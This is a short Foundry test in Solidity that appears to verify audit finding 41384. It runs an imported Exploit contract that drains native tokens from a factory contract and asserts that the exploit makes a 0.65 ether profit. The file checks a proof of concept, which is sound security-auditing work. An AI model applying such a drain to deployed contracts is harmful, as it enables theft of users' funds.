// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";

import {Exploit} from "./41384-c-03-native-tokens-can-be-drained-from-the-factory-contract.sol";
contract Finding41384Test is Test {
    function test_factory_fees_are_drained() public {
        Exploit e = new Exploit();
        vm.deal(address(e.factory()), 5 ether);
        vm.deal(address(this), 1 ether);
        e.run{value: 1 ether}();
        assertEq(e.profit(), 0.65 ether);
        assertEq(address(e.loot()).balance, 0.65 ether);
        assertEq(address(e.factory()).balance, 4.3 ether);
        assertEq(address(e.comm()).balance, 0.05 ether);
    }
}
